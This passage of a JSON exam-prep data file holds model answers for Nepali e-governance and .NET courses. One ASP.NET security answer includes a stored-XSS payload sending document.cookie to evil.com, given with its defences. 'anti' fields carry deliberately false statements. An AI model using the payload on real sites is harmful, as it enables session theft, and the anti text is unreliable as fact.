one."},"top":{"id":"egov-19","q":"Explain the Security Management Model for e-government systems.","y":"E-gov Model Set","marks":5,"rep":0,"ans":"The security management model for e-government is a continuous cycle that keeps security aligned with services, rather than a one-time technical fix.\n• Governance and policy: security policy, data classification, roles such as a CISO, legal compliance.\n• Risk assessment: inventory assets, then risk = threat × vulnerability × impact, prioritised by impact on critical services.\n• Control implementation: physical, network, host, application, data and identity controls in depth.\n• Monitoring and incident response: logs and SIEM, alerts, CERT coordination, containment and recovery.\n• Audit and compliance: internal and external audit, ISO/IEC 27001, penetration testing.\n• Awareness and training: phishing drills, acceptable-use policy, background checks.\n• Continuous improvement: lessons feed back into policy under PDCA.\nCross-cutting: least privilege, segregation of duties, need-to-know. Nepal: the National CERT under MoCIT handles incidents and the Cyber Security Policy 2077 sets direction. The model is people plus process plus technology, and audit makes it real.","skel":["Define as continuous management cycle","Governance and policy stage","Risk assessment with the risk formula","Controls, monitoring, incident response","Audit, training, continuous improvement"],"logic":"Near-identical to the security model question. The examiner wants a management cycle with named stages, so a product list scores poorly.","how":"This repeats the security model — a sure shot. Write it as a six-stage cycle ending in PDCA, and name ISO 27001 and the National CERT once each.","gateA":"The security management model for e-government is a continuous cycle that keeps security aligned with services, rather than a one-time technical fix.\n• Governance and policy: security policy, data classification, roles such as a CISO, legal compliance.\n• Risk assessment: inventory assets, then risk = threat × vulnerability × impact, prioritised by impact on critical services.\n• Control implementation: physical, network, host, application, data and identity controls in depth.\n• Monitoring and incident response: logs and SIEM, alerts, CERT coordination, containment and recovery.\n• Audit and compliance: internal and external audit, ISO/IEC 27001, penetration testing.\n• Awareness and training: phishing drills, acceptable-use policy, background checks.\n• Continuous improvement: lessons feed back into policy under PDCA.\nCross-cutting: least privilege, segregation of duties, need-to-know. Nepal: the National CERT under MoCIT handles incidents and the Cyber Security Policy 2077 sets direction. The model is people plus process plus technology, and audit makes it real. Define as continuous management cycle Governance and policy stage Risk assessment with the risk formula Controls, monitoring, incident response Audit, training, continuous improvement","anti":"The security management model is a one-time technical fix, not a cycle: policy and risk assessment are skipped, controls are installed once, and monitoring, incident response and audit are unnecessary after launch."},"keys":["Defence in depth","Security management model","Physical layer","Network layer","Application layer","Data layer"],"ask":[{"id":"egov-19","q":"Explain the Security Management Model for e-government systems.","y":"E-gov Model Set","marks":5,"rep":0},{"id":"egov-24","q":"Discuss the significance of cyber laws in protecting government digital infrastructure and citizen data in Nepal.","y":"E-gov Model Set","marks":5,"rep":0},{"id":"egov-33","q":"What is E-governance security architecture? Explain.","y":"E-gov Question Bank 2081","marks":5,"rep":0},{"id":"egov-4","q":"Explain the importance of Cyber Laws in E-Governance.","y":"E-Gov Question Bank 2082","marks":5,"rep":0}],"reps":[]},{"n":6,"name":"Case Studies","rank":5,"q":11,"m":55,"share":10,"cum":91,"hook":"A mechanic keeps case files so a new noise is matched to an old fault, not to a town.","idea":"A case is evidence for one fault class, not a country report. Bhoomi put the record of rights online and printed it at kiosks, so the village official's power to withhold or alter it disappeared; the measured gain was days and bribes, and the limitation was legal validity and connectivity. Read every case on four axes — fault, intervention, evidence, limitation — and the list stops being history: naming those four is what transfers to an unseen case.","one":"A case study is a diagnosis with a budget: pick it for the fault it demonstrates, not the country it happened in.","gate":{"q":"Why does Bhoomi earn marks as a removed middleman rather than as a Karnataka land portal?","a":"Because a case is evidence for one fault class, not a country report. Bhoomi put the record of rights online and printed it at kiosks, so the village official's power to withhold or alter it disappeared; the measured gain was days and bribes, and the limitation was legal validity and connectivity. Naming fault, intervention, evidence and limitation is what transfers to an unseen case."},"top":{"id":"egov-71","q":"How can we use human resource management software to support E-Government? Explain.","y":"E-gov Question Bank 2078","marks":5,"rep":2,"ans":"HRMIS supports e-government by putting civil-service people data and transactions into one trusted system.\n• Personnel records: one authoritative employee file — post, qualification, service history, training.\n• Establishment control: sanctioned versus filled posts, so vacancy shows by office.\n• Attendance and leave: biometric or app-based attendance, online leave with automatic balance.\n• Payroll and pension: salary, allowances, deductions and pension computed and paid through the treasury system.\n• Transfer and promotion: rule-based decisions with published transfer lists.\n• Performance and training: recorded targets, appraisal ratings and training needs.\n• Self-service and dashboards: staff see payslips; ministers see vacancy, absenteeism and wage cost.\nGains: ghost employees and proxy attendance shrink, transfers become merit-based, salaries are timely, planning uses real data. Nepal's civil-service HRMIS follows this model.","skel":["One authoritative employee record","Establishment control: sanctioned versus filled","Attendance, leave, payroll, pension","Transfer, promotion, appraisal, training","Gains: no ghost staff, merit transfers"],"logic":"Asks how software supports government, so each function needs an administrative benefit attached, not just a module name.","how":"Six bullets, each a function plus its governance gain; close with ghost employees and merit-based transfers.","gateA":"HRMIS supports e-government by putting civil-service people data and transactions into one trusted system.\n• Personnel records: one authoritative employee file — post, qualification, service history, training.\n• Establishment control: sanctioned versus filled posts, so vacancy shows by office.\n• Attendance and leave: biometric or app-based attendance, online leave with automatic balance.\n• Payroll and pension: salary, allowances, deductions and pension computed and paid through the treasury system.\n• Transfer and promotion: rule-based decisions with published transfer lists.\n• Performance and training: recorded targets, appraisal ratings and training needs.\n• Self-service and dashboards: staff see payslips; ministers see vacancy, absenteeism and wage cost.\nGains: ghost employees and proxy attendance shrink, transfers become merit-based, salaries are timely, planning uses real data. Nepal's civil-service HRMIS follows this model. One authoritative employee record Establishment control: sanctioned versus filled Attendance, leave, payroll, pension Transfer, promotion, appraisal, training Gains: no ghost staff, merit transfers","anti":"HRMIS fragments civil-service data into separate office files, so there is no authoritative employee record; establishment control hides sanctioned posts, attendance and payroll are manual, and the system creates ghost staff and arbitrary transfers."},"keys":["Bhoomi","e-Seva","Smart Nagarpalika","Nagarik App","NIC and NICNET","CARD"],"ask":[{"id":"egov-71","q":"How can we use human resource management software to support E-Government? Explain.","y":"E-gov Question Bank 2078","marks":5,"rep":2},{"id":"egov-84","q":"What are the main contents are needed for human resource management software? Explain.","y":"E-gov Question Bank 2076","marks":5,"rep":2},{"id":"egov-11","q":"Describe any two E-Government initiatives in Nepal and their impact.","y":"E-Gov Question Bank 2082","marks":5,"rep":0},{"id":"egov-44","q":"Mention the existing scenario of e-governance in Nepal.","y":"E-gov Question Bank 2080","marks":5,"rep":0}],"reps":[{"id":"r25","q":"What are the main contents are needed for human resource management software? Explain.","count":2,"marks":5}]},{"n":5,"name":"Data Warehousing and Data Mining in Government","rank":6,"q":8,"m":50,"share":9,"cum":100,"hook":"A cooperative's day book records today's sale; the closed ledger decides whether the year can be trusted.","idea":"A warehouse is the closed ledger: subject-oriented, integrated, time-variant, non-volatile. ETL fixes the definitions once at load, so every report counts the same thing. Mining is then disciplined questioning of stable history, finding patterns a till can never show, because the till overwrites yesterday in order to record today. The operational system is current, normalised and volatile, tuned for many small transactions rather than few large queries, so each correction overwrites yesterday; the warehouse fixes definitions once, freezes each period, and serves marts and OLAP, so mining can find patterns the live register cannot.","one":"A warehouse is the closed ledger behind the till: fixed definitions, frozen history, and patterns the till cannot see.","gate":{"q":"Why can a live land-records database not answer how enrolment changed over ten years?","a":"Because the operational system is current, normalised and volatile, tuned for many small transactions rather than few large historical queries. Each correction overwrites yesterday, and each ministry applies its own definition. A warehouse extracts through ETL, fixes definitions once, freezes each period, and serves marts and OLAP, so mining can find patterns the live register cannot."},"top":{"id":"egov-38","q":"What do you mean by data warehousing and data mining? Explain the applications of data warehousing and data mining in census and prices of essential commodities.","y":"E-gov Question Bank 2080","marks":10,"rep":2,"ans":"A data warehouse is a subject-oriented, integrated, time-variant, non-volatile store of data built from multiple source systems to support decision-making. Data mining extracts previously unknown, valid and useful patterns from large data using classification, clustering, association, regression and outlier detection.\nArchitecture to name: source systems → ETL → staging → warehouse → data marts → OLAP and mining → dashboards.\nCensus applications:\n• One population warehouse integrating census, vital registration and survey data.\n• District and ward population projections for budgets, schools, health posts and constituency delimitation.\n• Clustering districts by literacy, poverty and migration profile for targeted programmes.\n• Association rules linking migration with employment and education; classification to predict dropout.\n• Decade-on-decade trend analysis and SDG indicator monitoring.\nPrices of essential commodities:\n• Daily and weekly market prices from districts loaded into a price warehouse.\n• OLAP analysis by commodity, district and time; inflation and seasonal pattern detection.\n• Supply-chain decisions on buffer stock and distribution of subsidised rice and fuel.\n• Outlier detection flags abnormal spikes or hoarding, feeding consumer alerts by SMS or app.\nNepal: National Statistics Office census data and Department of Commerce price monitoring. Value depends on data quality and timeliness.","skel":["Define warehouse with four characteristics","Define mining and name techniques","Architecture: source, ETL, warehouse, marts, OLAP","Census: projections, clustering, trends","Commodity prices: OLAP, seasonality, outlier alerts"],"logic":"Tests definitions plus two named applications with technique-level detail. Marks are lost when students describe census data but not what mining does with it.","how":"Define both, name the warehouse architecture, then two application blocks. Each block must name a mining technique, not just a use.","gateA":"A data warehouse is a subject-oriented, integrated, time-variant, non-volatile store of data built from multiple source systems to support decision-making. Data mining extracts previously unknown, valid and useful patterns from large data using classification, clustering, association, regression and outlier detection.\nArchitecture to name: source systems → ETL → staging → warehouse → data marts → OLAP and mining → dashboards.\nCensus applications:\n• One population warehouse integrating census, vital registration and survey data.\n• District and ward population projections for budgets, schools, health posts and constituency delimitation.\n• Clustering districts by literacy, poverty and migration profile for targeted programmes.\n• Association rules linking migration with employment and education; classification to predict dropout.\n• Decade-on-decade trend analysis and SDG indicator monitoring.\nPrices of essential commodities:\n• Daily and weekly market prices from districts loaded into a price warehouse.\n• OLAP analysis by commodity, district and time; inflation and seasonal pattern detection.\n• Supply-chain decisions on buffer stock and distribution of subsidised rice and fuel.\n• Outlier detection flags abnormal spikes or hoarding, feeding consumer alerts by SMS or app.\nNepal: National Statistics Office census data and Department of Commerce price monitoring. Value depends on data quality and timeliness. Define warehouse with four characteristics Define mining and name techniques Architecture: source, ETL, warehouse, marts, OLAP Census: projections, clustering, trends Commodity prices: OLAP, seasonality, outlier alerts","anti":""},"keys":["Data warehouse","Four characteristics","ETL","Data mart","OLTP versus OLAP","Star schema"],"ask":[{"id":"egov-38","q":"What do you mean by data warehousing and data mining? Explain the applications of data warehousing and data mining in census and prices of essential commodities.","y":"E-gov Question Bank 2080","marks":10,"rep":2},{"id":"egov-75","q":"Explain the components of data warehouse. What are the applications of data mining in eGovernance in the context of Nepal.","y":"E-gov Question Bank 2076","marks":10,"rep":0},{"id":"egov-20","q":"How can data warehousing and data mining be utilized in planning, commerce, and rural development sectors? Explain with examples from Nepal.","y":"E-gov Model Set","marks":5,"rep":0},{"id":"egov-5","q":"How can we use data warehousing and data mining concepts in agriculture and rural development?","y":"E-Gov Question Bank 2082","marks":5,"rep":0}],"reps":[{"id":"r14","q":"What do you mean by data warehousing and data mining? Explain the applications of data warehousing and data mining in census and prices of essential commodities.","count":2,"marks":10}]}]},"ncc":{"name":".NET Centric Computing","code":"CSC378","exam":"2026-12-20","totalQ":80,"totalM":490,"units":[{"n":1,"name":"Language Preliminaries","rank":1,"q":17,"m":110,"share":22,"cum":22,"hook":"Why can the same method call print two different names, depending on how the variable was declared?","idea":"C# is compiled twice. Roslyn turns source into MSIL plus metadata inside an assembly, and the CLR JIT-compiles each method to native code on its first call, then caches it. Value types copy their data inline; reference types hold a heap reference. A virtual call with override resolves by the object's real type at run time, while new binds by the declared type at compile time.","one":"C# compiles once to a portable form, then to native code per machine; only virtual calls wait to see the real object.","gate":{"q":"Why can the same method call execute different code depending on how the variable was declared?","a":"Because binding, not the object, decides which body runs. A virtual method reached through override is resolved at run time from the object's actual type in its method table, so the derived body executes. A non-virtual method, or a base method hidden with new, is bound to the declared type at compile time, so the base body runs even when the object is derived."},"top":{"id":"ncc-1","q":"Define lambda expression. Distinguish between expression lambda and statement lambda. Write a program for asynchronous file read. List the benefits of Async and Await.","y":"NET Centric Model 2082","marks":10,"rep":0,"ans":"• Lambda expression — an anonymous function written as (parameters) => body, used to create a delegate or LINQ predicate without a named method.\n• Expression lambda — body is one expression whose value is returned: x => x * 2, or nums.Where(n => n % 2 == 0).\n• Statement lambda — body is a block with braces, several statements and an explicit return: (a, b) => { var s = a + b; return s; }.\nAsynchronous file read:\nusing System.IO;\nasync Task<string> ReadAsync() {\n  using var sr = new StreamReader(\"data.txt\");\n  return await sr.ReadToEndAsync();\n}\n// string text = await ReadAsync();\nThe compiler turns each await into a state machine: the thread returns to the pool until the read completes, then execution resumes.\nBenefits of async/await:\n1. Frees the request thread, so the server handles more users.\n2. Keeps the UI responsive during slow work.\n3. Simpler and safer than callbacks or Begin/End pairs.\n4. Scales I/O-bound work without extra threads.\n5. Exceptions propagate normally through try/catch, and code reads top to bottom.","skel":["Define lambda as anonymous function for delegates","Expression lambda returns; statement lambda uses braces","Write async method with ReadToEndAsync","Five benefits of async/await","Close on thread release during I/O"],"logic":"Tests whether you know a lambda is a delegate literal, not a LINQ feature, and whether you can write async I/O rather than only define it. The program separates memorisers from readers.","how":"Three blocks: definition plus two-line comparison, then one short ReadToEndAsync program, then five benefit bullets. Spend the marks on the program, not the prose.","gateA":"• Lambda expression — an anonymous function written as (parameters) => body, used to create a delegate or LINQ predicate without a named method.\n• Expression lambda — body is one expression whose value is returned: x => x * 2, or nums.Where(n => n % 2 == 0).\n• Statement lambda — body is a block with braces, several statements and an explicit return: (a, b) => { var s = a + b; return s; }.\nAsynchronous file read:\nusing System.IO;\nasync Task<string> ReadAsync() {\n  using var sr = new StreamReader(\"data.txt\");\n  return await sr.ReadToEndAsync();\n}\n// string text = await ReadAsync();\nThe compiler turns each await into a state machine: the thread returns to the pool until the read completes, then execution resumes.\nBenefits of async/await:\n1. Frees the request thread, so the server handles more users.\n2. Keeps the UI responsive during slow work.\n3. Simpler and safer than callbacks or Begin/End pairs.\n4. Scales I/O-bound work without extra threads.\n5. Exceptions propagate normally through try/catch, and code reads top to bottom. Define lambda as anonymous function for delegates Expression lambda returns; statement lambda uses braces Write async method with ReadToEndAsync Five benefits of async/await Close on thread release during I/O","anti":"A lambda expression is a named method that must be declared with a return type; an expression lambda uses braces and several statements, while a statement lambda returns a single expression, and async/await blocks the thread during I/O."},"keys":["MSIL (CIL)","CLI","CLR","JIT compilation","Value vs reference type","override vs new"],"ask":[{"id":"ncc-1","q":"Define lambda expression. Distinguish between expression lambda and statement lambda. Write a program for asynchronous file read. List the benefits of Async and Await.","y":"NET Centric Model 2082","marks":10,"rep":0},{"id":"ncc-13","q":"What is the difference between abstract class, interface, and sealed class? When would you use each? Write a program demonstrating the use of abstract class with abstract methods and sealed class to prevent inheritance.","y":"NET Centric Model Set","marks":10,"rep":0},{"id":"ncc-27","q":"Distinguish between collection and generics. What are named and positional attribute parameters? Write a program to create your own exception when the user gives subject name than “C#”.","y":"Net Centric Question 2081","marks":10,"rep":0},{"id":"ncc-41","q":"What are the needs for partial class and sealed class? How do you relate delegate with events? State the steps to depl0y .NET core application.","y":"NET Centric Question 2080","marks":10,"rep":0}],"reps":[]},{"n":4,"name":"Creating ASP.NET Core MVC Applications","rank":2,"q":11,"m":70,"share":14,"cum":37,"hook":"A form arrives with three fields missing. Who was supposed to notice, the browser or the server?","idea":"Routing maps a URL to a controller action, model binding fills action parameters, and data annotations decide whether ModelState is valid before your code runs. The action then chooses an action result: View renders Razor, Json returns data, RedirectToAction sends the browser elsewhere. That redirect exists because the browser's last request must not be a POST: returning the view leaves the address bar on the submitted URL, so refresh or back repeats the form and inserts a duplicate row, while a 302 and a GET leave an idempotent request that can be repeated harmlessly.","one":"An action is a route, a bound model, a validity check and a chosen result, with its collaborators injected rather than built.","gate":{"q":"Why does a successful POST action return RedirectToAction instead of View?","a":"Because the browser's last request must not be a POST. Returning the view leaves the address bar on the submitted URL, so refresh or back repeats the form and inserts a duplicate row. RedirectToAction answers with a 302 and a GET to a safe URL, leaving an idempotent request that can be repeated harmlessly."},"top":{"id":"ncc-14","q":"What are different Action Result Types in ASP.NET Core MVC? Explain with examples. Design an API Controller that returns JSON response for a Product entity (ProductId, Name, Price, Category) with GET, POST, PUT, and DELETE operations.","y":"NET Centric Model Set","marks":10,"rep":0,"ans":"Action results are what an action returns; ASP.NET Core executes them to build the response.\n• View()/ViewResult — renders a .cshtml. PartialView() — fragment only.\n• Json()/JsonResult — serialised JSON. Content() — plain text or HTML string.\n• File() — bytes or stream with a content type. Redirect()/RedirectToAction() — 302.\n• Ok(), NotFound(), BadRequest(), NoContent(), StatusCode() — raw HTTP codes.\n• Challenge() — 401 through the authentication handler. EmptyResult — no body.\nAPI controller for Product(ProductId, Name, Price, Category):\n[ApiController]\n[Route(\"api/[controller]\")]\npublic class ProductsController : ControllerBase {\n  private readonly AppDbContext _db;\n  public ProductsController(AppDbContext db) => _db = db;\n\n  [HttpGet] public async Task<IActionResult> GetAll() =>\n      Ok(await _db.Products.ToListAsync());\n  [HttpGet(\"{id:int}\")] public async Task<IActionResult> Get(int id) {\n    var p = await _db.Products.FindAsync(id);\n    return p == null ? NotFound() : Ok(p);\n  }\n  [HttpPost] public async Task<IActionResult> Post(Product p) {\n    _db.Products.Add(p); await _db.SaveChangesAsync();\n    return CreatedAtAction(nameof(Get), new { id = p.ProductId }, p);   // 201\n  }\n  [HttpPut(\"{id:int}\")] public async Task<IActionResult> Put(int id, Product p) {\n    if (id != p.ProductId) return BadRequest();\n    _db.Entry(p).State = EntityState.Modified;\n    await _db.SaveChangesAsync(); return NoContent();                    // 204\n  }\n  [HttpDelete(\"{id:int}\")] public async Task<IActionResult> Delete(int id) {\n    var p = await _db.Products.FindAsync(id);\n    if (p == null) return NotFound();\n    _db.Products.Remove(p); await _db.SaveChangesAsync(); return NoContent();\n  }\n}\n[ApiController] adds automatic model validation and JSON binding.","skel":["Results: View, Json, Content, File, Redirect","Status results: Ok, NotFound, BadRequest, NoContent","ControllerBase with [ApiController] and route","GET, POST returning CreatedAtAction","PUT checks id and returns 204; DELETE 404 or 204"],"logic":"Tests the mapping from action results to HTTP status codes, then whether you can build a REST controller. Returning View() in an API or 200 on create are the common errors.","how":"List results in pairs with their status code, then one compact controller with the four verbs. Match POST to 201 and PUT/DELETE to 204.","gateA":"Action results are what an action returns; ASP.NET Core executes them to build the response.\n• View()/ViewResult — renders a .cshtml. PartialView() — fragment only.\n• Json()/JsonResult — serialised JSON. Content() — plain text or HTML string.\n• File() — bytes or stream with a content type. Redirect()/RedirectToAction() — 302.\n• Ok(), NotFound(), BadRequest(), NoContent(), StatusCode() — raw HTTP codes.\n• Challenge() — 401 through the authentication handler. EmptyResult — no body.\nAPI controller for Product(ProductId, Name, Price, Category):\n[ApiController]\n[Route(\"api/[controller]\")]\npublic class ProductsController : ControllerBase {\n  private readonly AppDbContext _db;\n  public ProductsController(AppDbContext db) => _db = db;\n\n  [HttpGet] public async Task<IActionResult> GetAll() =>\n      Ok(await _db.Products.ToListAsync());\n  [HttpGet(\"{id:int}\")] public async Task<IActionResult> Get(int id) {\n    var p = await _db.Products.FindAsync(id);\n    return p == null ? NotFound() : Ok(p);\n  }\n  [HttpPost] public async Task<IActionResult> Post(Product p) {\n    _db.Products.Add(p); await _db.SaveChangesAsync();\n    return CreatedAtAction(nameof(Get), new { id = p.ProductId }, p);   // 201\n  }\n  [HttpPut(\"{id:int}\")] public async Task<IActionResult> Put(int id, Product p) {\n    if (id != p.ProductId) return BadRequest();\n    _db.Entry(p).State = EntityState.Modified;\n    await _db.SaveChangesAsync(); return NoContent();                    // 204\n  }\n  [HttpDelete(\"{id:int}\")] public async Task<IActionResult> Delete(int id) {\n    var p = await _db.Products.FindAsync(id);\n    if (p == null) return NotFound();\n    _db.Products.Remove(p); await _db.SaveChangesAsync(); return NoContent();\n  }\n}\n[ApiController] adds automatic model validation and JSON binding. Results: View, Json, Content, File, Redirect Status results: Ok, NotFound, BadRequest, NoContent ControllerBase with [ApiController] and route GET, POST returning CreatedAtAction PUT checks id and returns 204; DELETE 404 or 204","anti":"Action results are inputs the controller receives, not outputs it returns; View() serialises JSON, Json() renders a .cshtml, and an API controller should return views rather than Ok, NotFound or CreatedAtAction."},"keys":["Controller","IActionResult","Action results","Conventional routing","Attribute routing","Model binding sources"],"ask":[{"id":"ncc-14","q":"What are different Action Result Types in ASP.NET Core MVC? Explain with examples. Design an API Controller that returns JSON response for a Product entity (ProductId, Name, Price, Category) with GET, POST, PUT, and DELETE operations.","y":"NET Centric Model Set","marks":10,"rep":0},{"id":"ncc-2","q":"What is the process to capture Razor output? Explain the ASP.NET Core features to dynamically generate HTML content using C# and send it to the client, separating the application’s concern.","y":"NET Centric Model 2082","marks":10,"rep":0},{"id":"ncc-28","q":"How do you create controller? Illustrate with an example. Describe the procedure of rendering HTML with Razor with scenario.","y":"Net Centric Question 2081","marks":10,"rep":0},{"id":"ncc-19","q":"What is model binding in ASP.NET Core? Explain server-side model validation with data annotations.","y":"NET Centric Model Set","marks":5,"rep":0}],"reps":[]},{"n":8,"name":"Securing ASP.NET Core","rank":3,"q":10,"m":55,"share":11,"cum":48,"hook":"A user is logged in and still gets a 403. What is the difference between that and a 401?","idea":"Authentication establishes identity: Identity hashes passwords with PBKDF2, stores users, roles and claims, and issues a cookie or token. Authorization then decides access through [Authorize], roles, policies or claims, and runs after authentication in the pipeline. Anti-forgery pairs a cookie with a form token. Razor encodes output, parameters keep data out of SQL syntax, and Url.IsLocalUrl blocks an off-site returnUrl. That order is not optional: authorization can only judge a principal that already exists, so reversed it would meet an anonymous principal, every protected action would challenge with 401, and no role check could ever pass.","one":"Authentication says who you are, authorization says which doors open, and every attack is the server trusting the client once too often.","gate":{"q":"Why does ASP.NET Core run authentication before authorization in the pipeline?","a":"Because authorization can only judge a principal that already exists. Authentication reads the cookie or token and fills HttpContext.User with claims, then every Authorize attribute, role and policy is evaluated against those claims. Reversed, authorization would meet an anonymous principal, so every protected action would challenge with 401 and no role check could ever pass."},"top":{"id":"ncc-58","q":"Explain the uses of cookies. What types of vulnerabilities can occur in web application? Show the case of Cross-site Scripting attack.","y":"NET Centric Question 2079","marks":10,"rep":0,"ans":"Cookies - small name-value text (4 KB maximum) the server sends in Set-Cookie and the browser returns on every request to that domain.\nUses: session ID so a stateless protocol remembers the user; authentication ticket and remember-me; shopping cart for anonymous visitors; theme and language preference; consent flags; analytics and A/B tracking.\nSet safely: Response.Cookies.Append(\"theme\", \"dark\", new CookieOptions { HttpOnly = true, Secure = true, SameSite = SameSiteMode.Strict });\n\nVulnerabilities that can occur: XSS, SQL injection, CSRF, open redirect, broken access control/IDOR, insecure deserialization, sensitive data exposure, clickjacking, misconfiguration, weak authentication.\n\nXSS case - a comment box stores raw input. The attacker posts:\n<script>fetch('http://evil.com?c='+document.cookie)</script>\nIf the view renders it with @Html.Raw(comment) instead of encoded output, the script runs in every visitor's browser and steals the session cookie.\nDefence: Razor output encoding, never Html.Raw on user data, input validation, HttpOnly cookies, Content-Security-Policy.","skel":["Cookies: session id, auth, cart, theme","Set HttpOnly, Secure, SameSite","Vulnerability list: XSS, SQLi, CSRF, IDOR","XSS: comment box stores a script tag","Defence: encode output, no Html.Raw"],"logic":"Three-part security question: uses of cookies, a taxonomy of web vulnerabilities, and one XSS attack shown concretely. The XSS payload is where marks are won.","how":"Cookies as five uses plus a safe-set line, a fast vulnerability list, then the stored-XSS payload and fix.","gateA":"Cookies - small name-value text (4 KB maximum) the server sends in Set-Cookie and the browser returns on every request to that domain.\nUses: session ID so a stateless protocol remembers the user; authentication ticket and remember-me; shopping cart for anonymous visitors; theme and language preference; consent flags; analytics and A/B tracking.\nSet safely: Response.Cookies.Append(\"theme\", \"dark\", new CookieOptions { HttpOnly = true, Secure = true, SameSite = SameSiteMode.Strict });\n\nVulnerabilities that can occur: XSS, SQL injection, CSRF, open redirect, broken access control/IDOR, insecure deserialization, sensitive data exposure, clickjacking, misconfiguration, weak authentication.\n\nXSS case - a comment box stores raw input. The attacker posts:\n<script>fetch('http://evil.com?c='+document.cookie)</script>\nIf the view renders it with @Html.Raw(comment) instead of encoded output, the script runs in every visitor's browser and steals the session cookie.\nDefence: Razor output encoding, never Html.Raw on user data, input validation, HttpOnly cookies, Content-Security-Policy. Cookies: session id, auth, cart, theme Set HttpOnly, Secure, SameSite Vulnerability list: XSS, SQLi, CSRF, IDOR XSS: comment box stores a script tag Defence: encode output, no Html.Raw","anti":"Cookies are large server-side files that the browser never returns; HttpOnly, Secure and SameSite make XSS easier, and the defence is to render user input with Html.Raw so the script executes."},"keys":["Authentication","Authorization","ASP.NET Core Identity","Password hashing","Claims","Policies"],"ask":[{"id":"ncc-58","q":"Explain the uses of cookies. What types of vulnerabilities can occur in web application? Show the case of Cross-site Scripting attack.","y":"NET Centric Question 2079","marks":10,"rep":0},{"id":"ncc-12","q":"What is SPA? Write code to define a role for admin who can create, update, and delete any article.","y":"NET Centric Model 2082","marks":5,"rep":0},{"id":"ncc-24","q":"What is ASP.NET Core Identity? Explain the process of adding authentication to an application and configuring identity services.","y":"NET Centric Model Set","marks":5,"rep":0},{"id":"ncc-34","q":"Distinguish between roles and policies. Explain about Kestrel web server in ASP.NET core.","y":"Net Centric Question 2081","marks":5,"rep":0}],"reps":[]},{"n":5,"name":"Working with Database","rank":4,"q":8,"m":55,"share":11,"cum":59,"hook":"Two programs read the same table; one breaks when a column is renamed and the other does not. Why?","idea":"ADO.NET is the hand translator: SqlConnection opens, SqlCommand carries SQL and parameters, ExecuteReader streams rows forward-only, and an adapter fills a disconnected DataSet. EF Core is the clerk: a DbSet is a table, LINQ is the request, and the DbContext tracks each loaded entity so SaveChanges writes only the differences. Either way parameters keep code and data on separate channels: the statement text is parsed and its plan built before any value is bound, so a value can only ever occupy a slot and never become syntax. Manual escaping or stripping is a blocklist that misses numeric contexts, second-order data and encoding differences, so one forgotten path still exposes the table.","one":"ADO.NET makes you write the SQL, while EF Core writes it from LINQ and remembers what you changed until SaveChanges.","gate":{"q":"Why do parameters stop SQL injection when escaping quotes in the input does not?","a":"Because parameters keep code and data on separate channels. The statement text is parsed and its plan built before any value is bound, so a value can only ever occupy a slot and never become syntax. Manual escaping or stripping is a blocklist that misses numeric contexts, second-order data and encoding differences, so one forgotten path still exposes the table."},"top":{"id":"ncc-29","q":"List some advantages of Entity Framework over ADO.NET. Assume a database named “IOST” with a table FACULTY(Course_Name, CourseID, No_of_Semester, fee). Insert some records using ADO.NET and retrive the fee of records having name CSIT.","y":"Net Centric Question 2081","marks":10,"rep":0,"ans":"Advantages of Entity Framework over ADO.NET:\n• No hand-written SQL or manual mapping — entities and DbSet<T> instead.\n• LINQ gives compile-time checking instead of strings.\n• Change tracking with SaveChanges as a unit of work.\n• Relationships through navigation properties, loaded with Include or lazily.\n• Code-First migrations keep the schema in version control.\n• Provider independence: one API for SQL Server, PostgreSQL, SQLite.\n• Parameterised by default, so SQL injection risk drops, and async APIs throughout.\nInsert into FACULTY (ADO.NET):\nusing var con = new SqlConnection(cs); con.Open();\nstring ins = \"INSERT INTO FACULTY(Course_Name,CourseID,No_of_Semester,fee) VALUES(@n,@c,@s,@f)\";\nforeach (var f in list) {\n  using var cmd = new SqlCommand(ins, con);\n  cmd.Parameters.AddWithValue(\"@n\", f.Name);\n  cmd.Parameters.AddWithValue(\"@c\", f.Id);\n  cmd.Parameters.AddWithValue(\"@s\", f.Sem);\n  cmd.Parameters.AddWithValue(\"@f\", f.Fee);\n  cmd.ExecuteNonQuery();\n}\nRetrieve the fee for CSIT:\nusing var q = new SqlCommand(\"SELECT fee FROM FACULTY WHERE Course_Name=@n\", con);\nq.Parameters.AddWithValue(\"@n\", \"CSIT\");\nusing var r = q.ExecuteReader();\nwhile (r.Read()) Console.WriteLine(r[\"fee\"]);","skel":["EF: no SQL, LINQ, type safe","Change tracking, relationships, migrations","INSERT loop with four parameters","SELECT fee WHERE Course_Name = @n","ExecuteReader then loop r.Read"],"logic":"Tests ORM justification plus raw ADO.NET insert-and-read. The insert loop with parameters is the hard half; a SELECT * without the CSIT filter fails.","how":"Half the page on EF advantages, then one parameterised INSERT loop and one parameterised SELECT. Reuse the same connection object for both.","gateA":"Advantages of Entity Framework over ADO.NET:\n• No hand-written SQL or manual mapping — entities and DbSet<T> instead.\n• LINQ gives compile-time checking instead of strings.\n• Change tracking with SaveChanges as a unit of work.\n• Relationships through navigation properties, loaded with Include or lazily.\n• Code-First migrations keep the schema in version control.\n• Provider independence: one API for SQL Server, PostgreSQL, SQLite.\n• Parameterised by default, so SQL injection risk drops, and async APIs throughout.\nInsert into FACULTY (ADO.NET):\nusing var con = new SqlConnection(cs); con.Open();\nstring ins = \"INSERT INTO FACULTY(Course_Name,CourseID,No_of_Semester,fee) VALUES(@n,@c,@s,@f)\";\nforeach (var f in list) {\n  using var cmd = new SqlCommand(ins, con);\n  cmd.Parameters.AddWithValue(\"@n\", f.Name);\n  cmd.Parameters.AddWithValue(\"@c\", f.Id);\n  cmd.Parameters.AddWithValue(\"@s\", f.Sem);\n  cmd.Parameters.AddWithValue(\"@f\", f.Fee);\n  cmd.ExecuteNonQuery();\n}\nRetrieve the fee for CSIT:\nusing var q = new SqlCommand(\"SELECT fee FROM FACULTY WHERE Course_Name=@n\", con);\nq.Parameters.AddWithValue(\"@n\", \"CSIT\");\nusing var r = q.ExecuteReader();\nwhile (r.Read()) Console.WriteLine(r[\"fee\"]); EF: no SQL, LINQ, type safe Change tracking, relationships, migrations INSERT loop with four parameters SELECT fee WHERE Course_Name = @n ExecuteReader then loop r.Read","anti":"Entity Framework is worse than ADO.NET because it forces hand-written SQL and manual mapping, LINQ is checked only at run time, and there is no change tracking, relationship loading or migration, so every query needs ExecuteReader."},"keys":["SqlConnection","SqlCommand","ExecuteNonQuery","ExecuteScalar","SqlDataReader","SqlDataAdapter and DataSet"],"ask":[{"id":"ncc-29","q":"List some advantages of Entity Framework over ADO.NET. Assume a database named “IOST” with a table FACULTY(Course_Name, CourseID, No_of_Semester, fee). Insert some records using ADO.NET and retrive the fee of records having name CSIT.","y":"Net 